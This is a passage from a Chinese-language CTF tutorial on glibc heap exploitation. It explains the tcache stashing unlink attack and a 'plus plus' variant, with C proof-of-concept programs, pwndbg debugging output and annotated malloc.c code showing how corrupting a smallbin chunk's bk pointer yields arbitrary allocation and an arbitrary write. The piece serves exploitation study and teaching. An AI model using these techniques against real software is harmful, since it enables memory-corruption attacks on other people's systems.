        printf("\n5. overwrite the first chunk in smallbin[4]'s bk pointer to &victim-0x10 address, the first chunk is smallbin[4]->fd\n");
        printf("Change %p's bk pointer to &victim-0x10 address: 0x%lx\n", s2+0x3c0, (uint64_t)(&victim)-0x10);
        *(uint64_t*)((s2+0x3c0)+0x18) = (uint64_t)(&victim)-0x10;
        printf("\n6. use calloc to apply to smallbin[4], it will trigger stash mechanism in smallbin.\n");
        calloc(1, 0x50);
        printf("Now, the tcache_entry[4] list is %p --> %p --> %p --> %p --> %p --> %p --> %p\n", 
            &victim, s2+0x3d0, t1, t1-0x60, t1-0x60*2, t1-0x60*3, t1-0x60*4);
        printf("Apply to tcache_entry[4], you can get a pointer to victim address\n");
        uint64_t *r = (uint64_t*)malloc(0x50);
        r[0] = 0xaa;
        r[1] = 0xbb;
        r[2] = 0xcc;
        r[3] = 0xdd;
        printf("victim's vaule: [0x%lx, 0x%lx, 0x%lx, 0x%lx]\n", 
            victim[0], victim[1], victim[2], victim[3]);
        return 0;
    }
由于大多地方调试信息都相似，只分析一下重点处的相关信息：
####  重点调试过程
    b 70
先断在源程序代码的第70行，下面紧跟着的是calloc.  
看下内存信息：  
被恶意chage的smallbin chunk：
    pwndbg> x/30gx 0x555555559dd0
    0x555555559dd0: 0x0000000000000000      0x0000000000000061
    0x555555559de0: 0x0000555555559860      0x0000555555558050(tag-0x10)
即将被取走的smallbin chunk：
    pwndbg> x/30gx 0x0000555555559860
    0x555555559860: 0x0000000000000000      0x0000000000000061
    0x555555559870: 0x00007ffff7fbac30      0x0000555555559dd0
接着si进入calloc内部,进入malloc.c：
    pwndbg> b 3654
    Breakpoint 3 at 0x7ffff7e69c87: file malloc.c, line 3655.
直接断在stash区进行分析:
#####  第一轮的stash：
          if (tcache && tc_idx counts[tc_idx] bk)  也就是 tc_victim = bin->bk
    pwndbg> p tc_victim
    $19 = (mchunkptr) 0x555555559dd0
    pwndbg> x/30gx 0x555555559dd0
    0x555555559dd0: 0x0000000000000000      0x0000000000000061
    0x555555559de0: 0x00007ffff7fbac30      0x0000555555558050
    {
              if (tc_victim != 0)
                {
                  bck = tc_victim->bk; //bck = tag-0x10
                  set_inuse_bit_at_offset (tc_victim, nb);
                  if (av != &main_arena)
                set_non_main_arena (tc_victim);
                  bin->bk = bck; //tag - 0x10 被写在bin->bk处
                  bck->fd = bin; //bin 被写在tag处
              //将 bin 的 bk 指向 tc_victim 的后一个 Chunk，将 tc_victim 后一个 Chunk 的 fd 指向 bin，即将 tc_victim 取出
                  tcache_put (tc_victim, tc_idx);
                    }
            }
    pwndbg> x/30gx 0x0000555555558050
    0x555555558050: 0x0000000000000000      0x0000000000000000
    0x555555558060 :        0x00007ffff7fbac30      0x0000555555558060
    0x555555558070 :     0x0000000000000000      0x0000000000000000
    pwndbg> x/30gx 0x00007ffff7fbac30
    0x7ffff7fbac30 :        0x00007ffff7fbac20      0x00007ffff7fbac20
    0x7ffff7fbac40 :        0x0000555555559dd0      0x0000555555558050（tag - 0x10）
tcache 放入了 `tc_victim = 0x555555559de0`
    (0x60)   tcache_entry[4](6): 0x555555559de0 --> 0x555555559440 --> 0x5555555593e0 --> 0x555555559380 --> 0x555555559320 --> 0x5555555592c0
#####  第二轮的stash：
重点攻击的是`tc_victim` 也就是目标地址。
    pwndbg> p tc_victim
    $21 = (mchunkptr) 0x555555558050
很明显最终目标也就是保证让`tc_victim`放入tcache即可。观察代码，可以发现仅需要保证的也就是不要让程序crush。
    if (tc_victim != 0)
                {
                //得保证目标地址chunk的bk为可写的指针
                  bck = tc_victim->bk; //tag-0x10->bk=bck =tag+8 
                  set_inuse_bit_at_offset (tc_victim, nb);
                  if (av != &main_arena)
                set_non_main_arena (tc_victim);
                  bin->bk = bck;
                  bck->fd = bin; //保证一个可写的bck，程序即可正常的执行
              //将 bin 的 bk 指向 tc_victim 的后一个 Chunk，将 tc_victim 后一个 Chunk 的 fd 指向 bin，即将 tc_victim 取出
                  tcache_put (tc_victim, tc_idx);
其得保证`tc_victim->bk`是一个可写指针，此示例程序是`&victim`，是其他的也是可以的。
    pwndbg> x/30gx 0x555555558050
    0x555555558050: 0x0000000000000000      0x0000000000000000
    0x555555558060 :        0x00007ffff7fbac30      0x0000555555558060
    0x555555558070 :     0x0000000000000000      0x0000000000000000
    pwndbg> p bck
    $22 = (mchunkptr) 0x555555558060 
执行完毕后，获得一个目标地址的chunk进入了tcache，也达到了阈值，也就退出了 stash 循环。  
并且再次申请一下就得到一个目标地址的chunk。
    (0x60)   tcache_entry[4](7): 0x555555558060 --> 0x555555559de0 --> 0x555555559440 --> 0x5555555593e0 --> 0x555555559380 --> 0x555555559320 --> 0x5555555592c0
####  小总结
  * 先放入 2 个 Chunk 到 Smallbins，5 个 Chunk 到对应的 tcache
  * 在不破坏 fd 的情况下， **将后放入 Smallbins 的 Chunk 的 bk 设置为目标地址减 0x10，同时要将目标地址加 0x8 处的值设置为一个指向一处可写内存的指针；**
  * 接着用calloc触发stash 机制，会将后放入 Smallbins 的 Chunk 被放入 tcache，此时的 bin->bk 就是目标地址减 0x10，相当于把目标地址减 0x10 的指针链接进了 smallbins 中。
  * 之后不满足终止条件，会进行下一次的 stash，这时的 `tc_victim` 就是目标地址。接下来由于原来的设置，目标地址加 0x8 处的指针是一个可写指针，保证stash流程正常走完。
  * 最后目标地址就会被放入 `tcache_entry`的头部，stash 满足终止条件而终止。
重点在攻击最后一个进入smallbin的bk指针，让其指向目标地址-0x10的地方，并且 **保证目标地址+8的位置为一个可写的指针。**
### `tcache_stashing_unlink plus plus`
也就是可以同时实现上面的2个功能。
  * 任意地址分配一个chunk
  * 任意地址写入一个`main_arena`附近的值
####  示例代码
    #include 
    #include 
    #include 
    static uint64_t victim[4] = {0, 0, 0, 0};
    static uint64_t victim2 = 0;
    int main(int argc, char **argv){
        setbuf(stdout, 0);
        setbuf(stderr, 0);
        char *t1;
        char *s1, *s2, *pad;
        char *tmp;
        printf("You can use this technique to get a tcache chunk to arbitrary address, at the same time, write a big number to arbitrary address\n");
        printf("\n1. need to know heap address, the victim address that you need to get chunk pointer and the victim address that you need to write a big number\n");
        tmp = malloc(0x1);
        printf("victim's address: %p, victim's vaule: [0x%lx, 0x%lx, 0x%lx, 0x%lx]\n", 
            &victim, victim[0], victim[1], victim[2], victim[3]);
        printf("victim2's address: %p, victim2's value: 0x%lx\n",
            &victim2, victim2);
        printf("heap address: %p\n", tmp-0x260);
        printf("\n2. change victim's data, make victim[1] = &victim2-0x10\n");
        victim[1] = (uint64_t)(&victim2)-0x10;
        printf("victim's vaule: [0x%lx, 0x%lx, 0x%lx, 0x%lx]\n", 
            victim[0], victim[1], victim[2], victim[3]);
        printf("\n3. choose a stable size and free five identical size chunks to tcache_entry list\n");
        printf("Here, I choose the size 0x60\n");
        for(int i=0; i %p --> %p --> %p --> %p\n", 
            t1, t1-0x60, t1-0x60*2, t1-0x60*3, t1-0x60*4);
        printf("\n4. free two chunk with the same size like tcache_entry into the corresponding smallbin\n");
        s1 = malloc(0x420);
        printf("Alloc a chunk %p, whose size is beyond tcache size threshold\n", s1);
        pad = malloc(0x20);
        printf("Alloc a padding chunk, avoid %p to merge to top chunk\n", s1);
        free(s1);
        printf("Free chunk %p to unsortedbin\n", s1);
        malloc(0x3c0);
        printf("Alloc a calculated size, make the rest chunk size in unsortedbin is 0x60\n");
        malloc(0x100);
        printf("Alloc a chunk whose size is larger than rest chunk size in unsortedbin, that will trigger chunk to other bins like smallbins\n");
        printf("chunk %p is in smallbin[4], whose size is 0x60\n", s1+0x3c0);
        printf("Repeat the above steps, and free another chunk into corresponding smallbin\n");
        printf("A little difference, notice the twice pad chunk size must be larger than 0x60, or you will destroy first chunk in smallbin[4]\n");
        s2 = malloc(0x420);
        pad = malloc(0x80);
        free(s2);
        malloc(0x3c0);
        malloc(0x100);
        printf("chunk %p is in smallbin[4], whose size is 0x60\n", s2+0x3c0);
        printf("smallbin[4] list is %p  %p\n", s2+0x3c0, s1+0x3c0);
        printf("\n5. overwrite the first chunk in smallbin[4]'s bk pointer to &victim-0x10 address, the first chunk is smallbin[4]->fd\n");
        printf("Change %p's bk pointer to &victim-0x10 address: 0x%lx\n", s2+0x3c0, (uint64_t)(&victim)-0x10);
        *(uint64_t*)((s2+0x3c0)+0x18) = (uint64_t)(&victim)-0x10;
        printf("\n6. use calloc to apply to smallbin[4], it will trigger stash mechanism in smallbin.\n");
        calloc(1, 0x50);
        printf("Now, the tcache_entry[4] list is %p --> %p --> %p --> %p --> %p --> %p --> %p\n", 
            &victim, s2+0x3d0, t1, t1-0x60, t1-0x60*2, t1-0x60*3, t1-0x60*4);
        printf("Apply to tcache_entry[4], you can get a pointer to victim address\n");
        uint64_t *r = (uint64_t*)malloc(0x50);
        r[0] = 0xaa;
        r[1] = 0xbb;
        r[2] = 0xcc;
        r[3] = 0xdd;
        printf("victim's vaule: [0x%lx, 0x%lx, 0x%lx, 0x%lx]\n", 
            victim[0], victim[1], victim[2], victim[3]);
        printf("victim2's value: 0x%lx\n",
            victim2);
        return 0;
    }
####  调试过程
基本跟第2个一样，断点还是断在相似的位置，然后分析相关位置的代码即可。
调试完成发现，其跟第二个十分相似，只是在第二个中保证的是：`目标地址+8`为一个可写的地址即可。然而想要实现一个地方写入一个巨大的`main_arena`附近的值，只需把`目标地址+8`为这个地方-0x10即可。
          bck->fd = bin;
####  小总结
重点操作在：
  * 将 Smallbins 里的后一个进入的chunk的 bk 设置为目标地址 1 减 0x10。
  * 将目标地址 1 加 0x8 的位置设置为目标地址 2 减 0x10。
这样就可以分配到目标地址 1的chunk，同时向目标地址 2 写入一个大数字。
###  相关例题
  * `2019-HITCON-one_punch_man`
  * `2019-HITCON-lazyhouse`
  * `2020-XCTF-GXZY-twochunk`
  * `BUUCTF 新春红包3`
## 参加链接